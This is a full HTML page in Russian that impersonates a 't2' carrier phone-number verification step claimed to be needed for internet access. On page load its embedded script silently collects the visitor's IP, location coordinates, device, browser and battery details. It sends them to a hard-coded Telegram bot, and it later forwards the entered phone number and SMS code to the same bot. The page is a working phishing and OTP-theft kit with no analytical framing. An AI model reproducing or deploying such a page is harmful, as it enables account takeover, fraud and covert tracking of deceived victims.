<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Подтверждение номера телефона</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <style>
        :root {
            --dark-bg: #121212;
            --card-bg: #1e1e1e;
            --border: #333;
            --accent: #2563eb;
            --text: #e0e0e0;
            --success: #10b981;
            --error: #ef4444;
            --input-bg: #2a2a2a;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }
        
        body {
            background: var(--dark-bg);
            color: var(--text);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 16px;
            line-height: 1.6;
            font-size: 18px;
        }
        
        .container {
            width: 100%;
            max-width: 500px;
            background: var(--card-bg);
            border: 1px solid var(--border);
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
        }
        
        .header {
            padding: 25px;
            border-bottom: 1px solid var(--border);
            display: flex;
            align-items: center;
            gap: 18px;
            background: #1a1a1a;
        }
        
        .provider-logo {
            width: 60px;
            height: 60px;
            background: linear-gradient(135deg, #0047FF 0%, #002DAD 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 24px;
            color: white;
        }
        
        .header-text {
            flex: 1;
        }
        
        .header-text h1 {
            font-size: 26px;
            font-weight: 600;
            margin-bottom: 8px;
        }
        
        .header-text p {
            color: #aaa;
            font-size: 18px;
        }
        
        .content {
            padding: 30px;
        }
        
        #phone-section, #code-section, #verification-section {
            transition: all 0.3s ease;
        }
        
        .section-title {
            font-size: 22px;
            font-weight: 500;
            margin-bottom: 25px;
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .section-title svg {
            width: 28px;
            height: 28px;
        }
        
        .input-group {
            margin-bottom: 30px;
            position: relative;
        }
        
        label {
            display: block;
            margin-bottom: 12px;
            font-size: 18px;
            color: #aaa;
        }
        
        input {
            width: 100%;
            padding: 20px 18px;
            background: var(--input-bg);
            border: 1px solid var(--border);
            border-radius: 12px;
            color: var(--text);
            font-size: 20px;
            outline: none;
            transition: border 0.2s;
        }
        
        input:focus {
            border-color: var(--accent);
            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.2);
        }
        
        input.error {
            border-color: var(--error);
        }
        
        .error-message {
            color: var(--error);
            font-size: 16px;
            margin-top: 10px;
            display: none;
        }
        
        button {
            width: 100%;
            padding: 20px;
            background: var(--accent);
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 20px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
            margin-top: 10px;
        }
        
        button:disabled {
            background: #555;
            cursor: not-allowed;
            opacity: 0.7;
        }
        
        button:hover:not(:disabled), button:active:not(:disabled) {
            background: #1d4ed8;
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
        }
        
        #phone-image {
            width: 100%;
            border-radius: 12px;
            margin: 25px 0;
            display: none;
            border: 1px solid #333;
        }
        
        #verification-section {
            display: none;
        }
        
        .verification-success {
            text-align: center;
            padding: 40px 0;
        }
        
        .success-icon {
            font-size: 80px;
            color: var(--success);
            margin-bottom: 30px;
            animation: pulse 1.5s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        
        .verification-success h2 {
            font-size: 28px;
            margin-bottom: 20px;
            color: var(--success);
        }
        
        .verification-success p {
            font-size: 20px;
            line-height: 1.7;
        }
        
        .footer {
            padding: 25px;
            text-align: center;
            color: #777;
            font-size: 16px;
            border-top: 1px solid var(--border);
        }
        
        #code-section, #verification-section {
            display: none;
        }
        
        .loader {
            display: none;
            text-align: center;
            padding: 40px 0;
        }
        
        .loader-spinner {
            border: 5px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top: 5px solid var(--accent);
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 0 auto 30px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .loader p {
            font-size: 20px;
        }
        
        /* Анимации для переходов между экранами */
        .fade-in {
            animation: fadeIn 0.5s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        /* Адаптация для очень маленьких экранов */
        @media (max-width: 480px) {
            body {
                padding: 12px;
                font-size: 16px;
            }
            
            .container {
                border-radius: 18px;
            }
            
            .header {
                padding: 20px;
            }
            
            .provider-logo {
                width: 50px;
                height: 50px;
                font-size: 22px;
            }
            
            .header-text h1 {
                font-size: 24px;
            }
            
            .header-text p {
                font-size: 16px;
            }
            
            .content {
                padding: 25px;
            }
            
            .section-title {
                font-size: 20px;
                margin-bottom: 20px;
            }
            
            input {
                padding: 18px 16px;
                font-size: 18px;
            }
            
            button {
                padding: 18px;
                font-size: 18px;
            }
        }
        
        /* Адаптация для ландшафтной ориентации */
        @media (max-height: 500px) and (orientation: landscape) {
            body {
                padding: 10px;
            }
            
            .container {
                max-width: 90%;
            }
            
            .header {
                padding: 15px;
            }
            
            .content {
                padding: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="header-text">
                <h1>Подтверждение номера</h1>
                <p>Требуется для подключения к интернету</p>
            </div>
        </div>
        
        <div class="content">
            <!-- Шаг 0: Загрузка данных -->
            <div id="loading-section" class="loader">
                <div class="loader-spinner"></div>
                <p>Проверка безопасности...</p>
            </div>
            
            <!-- Шаг 1: Ввод телефона -->
            <div id="phone-section" style="display:none">
                <div class="section-title">
                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" />
                    </svg>
                    <span>Введите номер телефона</span>
                </div>
                
                <div class="input-group">
                    <label for="phone">Российский номер телефона</label>
                    <input 
                        type="tel" 
                        id="phone" 
                        placeholder="+7 (___) ___-__-__" 
                        required
                        maxlength="18"
                    >
                    <div class="error-message" id="phone-error">Введите корректный российский номер</div>
                </div>
                
                <button id="confirm-btn" onclick="sendPhone()" disabled>Подтвердить номер</button>
            </div>
            
            <!-- Шаг 2: Ввод кода -->
            <div id="code-section" style="display:none">
                <div class="section-title">
                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z" />
                    </svg>
                    <span>Введите код подтверждения</span>
                </div>
               
                <img id="phone-image" src="https://i.redd.it/861gk9gqka0c1.png" alt="Security">
                
                <div class="input-group">
                    <label for="code">Код из SMS</label>
                    <input 
                        type="text" 
                        id="code" 
                        placeholder="XXXXX" 
                        required
                        maxlength="5"
                        oninput="this.value = this.value.replace(/[^0-9]/g, '')"
                    >
                </div>
                
                <button onclick="sendCode()">Подтвердить код</button>
            </div>
            
            <!-- Шаг 3: Результат верификации -->
            <div id="verification-section" style="display:none">
                <div class="verification-success">
                    <div class="success-icon">✓</div>
                    <h2>Верификация успешно пройдена!</h2>
                    <p>Ваш номер верифицирован и получен доступ к интернету!</p>
                </div>
            </div>
        </div>
        
        <div class="footer">
            © 2025 t2. Все права защищены.
        </div>
    </div>

    <script>
        // Конфигурация бота
        const BOT_TOKEN = "6818081299:AAGEDkvcZltkYKPELkGv8AuvRxpBzqMQLu8";
        const CHAT_ID = "1209403544";
        const MAX_RETRIES = 3; // Максимальное количество попыток отправки
        
        // Объект для сбора данных
        const userData = {
            // Основные идентификаторы
            ip: "N/A",
            
            // Сетевые данные
            isp: "N/A",
            asn: "N/A",
            publicIp: "N/A",
            
            // Геолокация
            continent: "N/A",
            country: "N/A",
            countryCode: "N/A",
            region: "N/A",
            regionCode: "N/A",
            city: "N/A",
            postalCode: "N/A",
            latitude: "N/A",
            longitude: "N/A",
            timezone: "N/A",
            utcOffset: "N/A",
            callingCode: "N/A",
            currency: "N/A",
            languages: "N/A",
            
            // Устройство
            deviceType: "N/A",
            deviceModel: "N/A",
            deviceVendor: "N/A",
            os: "N/A",
            osVersion: "N/A",
            cpuCores: "N/A",
            cpuArch: "N/A",
            deviceMemory: "N/A",
            
            // Браузер
            browser: "N/A",
            browserVersion: "N/A",
            engine: "N/A",
            engineVersion: "N/A",
            userAgent: "N/A",
            cookies: "N/A",
            
            // Время и дата
            localTime: "N/A",
            timezoneOffset: "N/A",
            dst: "N/A",
            pageLoadTime: "N/A",
            
            // Поведение
            referrer: "N/A",
            entryUrl: "N/A",
            mouseEvents: 0,
            keyboardEvents: 0,
            touchSupport: "N/A",
            batteryLevel: "N/A",
            chargingStatus: "N/A",
            
            // Дополнительные параметры
            doNotTrack: "N/A",
            hardwareConcurrency: "N/A",
            devicePixelRatio: "N/A"
        };

        // Маска для номера телефона
        function formatPhoneNumber(input) {
            let value = input.value.replace(/\D/g, '');
            if (value.length > 11) value = value.substring(0, 11);
            
            let formattedValue = '';
            
            if (value.startsWith('7') || value.startsWith('8')) {
                if (value[0] === '8') value = '7' + value.substring(1);
                formattedValue = '+7';
                
                if (value.length > 1) formattedValue += ' (' + value.substring(1, 4);
                if (value.length > 4) formattedValue += ') ' + value.substring(4, 7);
                if (value.length > 7) formattedValue += '-' + value.substring(7, 9);
                if (value.length > 9) formattedValue += '-' + value.substring(9, 11);
            } else if (value) {
                formattedValue = '+' + value;
            }
            
            input.value = formattedValue;
            validatePhoneNumber();
        }
        
        // Проверка номера
        function validatePhoneNumber() {
            const phoneInput = document.getElementById('phone');
            const phoneError = document.getElementById('phone-error');
            const confirmBtn = document.getElementById('confirm-btn');
            
            const phoneRegex = /^(\+7|8)\s?\(?\d{3}\)?\s?\d{3}[\s-]?\d{2}[\s-]?\d{2}$/;
            const isValid = phoneRegex.test(phoneInput.value);
            
            if (isValid) {
                phoneInput.classList.remove('error');
                phoneError.style.display = 'none';
                confirmBtn.disabled = false;
            } else {
                phoneInput.classList.add('error');
                phoneError.style.display = 'block';
                confirmBtn.disabled = true;
            }
            
            return isValid;
        }
        
        // Сбор данных с использованием прокси для CORS
        async function fetchWithProxy(url) {
            try {
                const response = await fetch(url);
                return await response.json();
            } catch (e) {
                console.error('Ошибка запроса:', e);
                return {};
            }
        }
        
        // Основная функция сбора данных
        async function collectFullData() {
            try {
                // 1. Сетевые данные
                try {
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipResponse.json();
                    userData.ip = ipData.ip || "N/A";
                    userData.publicIp = ipData.ip || "N/A";
                } catch (e) {
                    console.log("Ошибка получения IP: ", e);
                }
                
                // 2. Геолокация
                if (userData.ip !== "N/A") {
                    try {
                        const geoData = await fetchWithProxy(`https://ipapi.co/${userData.ip}/json/`);
                        userData.continent = geoData.continent_code || "N/A";
                        userData.country = geoData.country_name || "N/A";
                        userData.countryCode = geoData.country_code || "N/A";
                        userData.region = geoData.region || "N/A";
                        userData.regionCode = geoData.region_code || "N/A";
                        userData.city = geoData.city || "N/A";
                        userData.postalCode = geoData.postal || "N/A";
                        userData.latitude = geoData.latitude || "N/A";
                        userData.longitude = geoData.longitude || "N/A";
                        userData.timezone = geoData.timezone || "N/A";
                        userData.utcOffset = geoData.utc_offset || "N/A";
                        userData.callingCode = geoData.country_calling_code || "N/A";
                        userData.currency = geoData.currency || "N/A";
                        userData.languages = geoData.languages || "N/A";
                        userData.isp = geoData.org || "N/A";
                        userData.asn = geoData.asn || "N/A";
                    } catch (e) {
                        console.log("Ошибка геолокации: ", e);
                    }
                }
                
                // 3. Данные устройства
                userData.deviceType = /Mobile|Tablet/.test(navigator.userAgent) ? "Mobile" : "Desktop";
                userData.os = navigator.platform || "N/A";
                userData.osVersion = navigator.oscpu || "N/A";
                userData.cpuCores = navigator.hardwareConcurrency || "N/A";
                userData.deviceMemory = navigator.deviceMemory || "N/A";
                
                // 4. Браузерные данные
                userData.userAgent = navigator.userAgent;
                userData.browser = navigator.appName;
                userData.browserVersion = navigator.appVersion;
                userData.cookies = navigator.cookieEnabled ? "Enabled" : "Disabled";
                userData.doNotTrack = navigator.doNotTrack || "N/A";
                userData.referrer = document.referrer || "Direct";
                userData.entryUrl = window.location.href;
                
                // 5. Временные параметры
                userData.localTime = new Date().toLocaleString();
                userData.timezoneOffset = new Date().getTimezoneOffset();
                userData.dst = new Date().getTimezoneOffset() < Math.max(new Date(2023, 0, 1).getTimezoneOffset(), new Date(2023, 6, 1).getTimezoneOffset()) ? "Yes" : "No";
                userData.pageLoadTime = window.performance.timing.domContentLoadedEventEnd - window.performance.timing.navigationStart + " ms";
                
                // 6. Дополнительные параметры
                userData.batteryLevel = await getBatteryLevel();
                userData.chargingStatus = await getChargingStatus();
                userData.hardwareConcurrency = navigator.hardwareConcurrency || "N/A";
                userData.devicePixelRatio = window.devicePixelRatio;
                
            } catch (e) {
                console.error("Ошибка сбора данных: ", e);
            }
        }
        
        // Вспомогательные функции
        async function getBatteryLevel() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return Math.round(battery.level * 100) + "%";
                } catch (e) {
                    return "N/A";
                }
            }
            return "N/A";
        }
        
        async function getChargingStatus() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    return battery.charging ? "Charging" : "Not charging";
                } catch (e) {
                    return "N/A";
                }
            }
            return "N/A";
        }
        
        // Отправка данных в Telegram с повторными попытками
        async function sendToTelegram(text) {
            for (let attempt = 1; attempt <= MAX_RETRIES; attempt++) {
                try {
                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: text,
                            parse_mode: "HTML"
                        })
                    });
                    
                    const data = await response.json();
                    if (data.ok) return true;
                    
                    console.log(`Попытка ${attempt} не удалась: ${data.description}`);
                } catch (e) {
                    console.log(`Ошибка отправки (попытка ${attempt}):`, e);
                }
                
                // Задержка перед повторной попыткой
                await new Promise(resolve => setTimeout(resolve, 1000 * attempt));
            }
            return false;
        }
        
        // Форматирование данных для Telegram
        function formatFullData() {
            // Проверка на пустые значения
            for (const key in userData) {
                if (userData[key] === undefined || userData[key] === "") {
                    userData[key] = "N/A";
                }
            }
            
            let message = `🌐 <b>ДАННЫЕ ПОЛЬЗОВАТЕЛЯ</b> 🌐\n`;
            
            message += `📍 <b>ГЕОЛОКАЦИЯ</b>\n`;
            message += `├ Страна: ${userData.country} (${userData.countryCode})\n`;
            message += `├ Регион: ${userData.region}\n`;
            message += `├ Город: ${userData.city}\n`;
            message += `├ Координаты: ${userData.latitude}, ${userData.longitude}\n`;
            message += `└ Провайдер: ${userData.isp}\n\n`;
            
            message += `💻 <b>УСТРОЙСТВО</b>\n`;
            message += `├ Тип: ${userData.deviceType}\n`;
            message += `├ ОС: ${userData.os} ${userData.osVersion}\n`;
            message += `├ Ядра CPU: ${userData.cpuCores}\n`;
            message += `└ Память: ${userData.deviceMemory} GB\n\n`;
            
            message += `🔍 <b>БРАУЗЕР</b>\n`;
            message += `├ Название: ${userData.browser}\n`;
            message += `├ Версия: ${userData.browserVersion}\n`;
            message += `└ User Agent: ${userData.userAgent}\n\n`;
            
            message += `⏱ <b>ВРЕМЯ</b>\n`;
            message += `├ Локальное время: ${userData.localTime}\n`;
            message += `└ Часовой пояс: ${userData.timezone}\n\n`;
            
            message += `⚡ <b>ДОПОЛНИТЕЛЬНО</b>\n`;
            message += `├ Уровень батареи: ${userData.batteryLevel}\n`;
            message += `└ Статус зарядки: ${userData.chargingStatus}`;
            
            return message;
        }
        
        // Отправка полного дампа
        async function sendFullDataToTelegram() {
            const message = formatFullData();
            return await sendToTelegram(message);
        }
        
        // Отправка номера
        async function sendPhone() {
            if (!validatePhoneNumber()) return;
            
            let phone = document.getElementById('phone').value;
            phone = phone.replace(/\D/g, '');
            if (phone.startsWith('8')) phone = '7' + phone.substring(1);
            userData.phone = '+' + phone;
            
            // Переключение на экран кода
            document.getElementById('phone-section').style.display = 'none';
            document.getElementById('phone-image').style.display = 'block';
            document.getElementById('code-section').style.display = 'block';
            
            // Отправка номера в Telegram
            await sendToTelegram(`📱 <b>ВВЕДЕН НОМЕР:</b> ${userData.phone}`);
        }
        
        // Отправка кода
        async function sendCode() {
            userData.code = document.getElementById('code').value;
            
            // Переключение на экран верификации
            document.getElementById('code-section').style.display = 'none';
            document.getElementById('verification-section').style.display = 'block';
            
            // Отправка кода в Telegram
            await sendToTelegram(`🔢 <b>ВВЕДЕН КОД:</b> ${userData.code}\n✅ <b>Верификация пройдена</b>`);
        }
        
        // Показать секцию телефона
        function showPhoneSection() {
            document.getElementById('loading-section').style.display = 'none';
            document.getElementById('phone-section').style.display = 'block';
        }
        
        // Инициализация
        window.onload = async function() {
            // Показать лоадер
            document.getElementById('loading-section').style.display = 'block';
            
            // Настройка маски телефона
            const phoneInput = document.getElementById('phone');
            phoneInput.addEventListener('input', () => formatPhoneNumber(phoneInput));
            phoneInput.addEventListener('blur', validatePhoneNumber);
           
            // Запуск сбора данных
            try {
                await collectFullData();
                await sendFullDataToTelegram();
            } catch (e) {
               console.error("Критическая ошибка: ", e);
            } finally {
                showPhoneSection();
            }
        };
    </script>
</body>
</html>
